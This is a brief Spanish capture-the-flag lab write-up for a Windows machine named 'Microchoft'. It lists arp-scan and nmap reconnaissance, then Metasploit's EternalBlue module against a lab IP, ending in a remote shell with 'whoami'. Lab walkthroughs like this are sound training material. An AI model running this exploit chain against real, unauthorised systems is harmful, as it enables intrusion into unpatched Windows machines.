# Microchoft

[https://thehackerslabs.com/microchoft/](https://thehackerslabs.com/microchoft/)

![image.png](./imagenes/image%2017.png)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2018.png)

```bash
ping -c 1 10.0.3.24
```

![image.png](./imagenes/image%2019.png)

Es una maquian Windows

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.24
```

![image.png](./imagenes/image%2020.png)

- Lanzamos el metasploit
    
    ![image.png](./imagenes/image%2021.png)
    
    `search eternalblue`
    
    ![image.png](./imagenes/image%2022.png)
    
    `use 0`
    
    ![image.png](./imagenes/image%2023.png)
    
    `show options`
    
    `set RHOSTS 10.0.3.24`
    
    ![image.png](./imagenes/image%2024.png)
    
    `run`
    
    ![image.png](./imagenes/image%2025.png)
    
    `shell`
    
    `whoami`
    
    ![image.png](./imagenes/image%2026.png)
  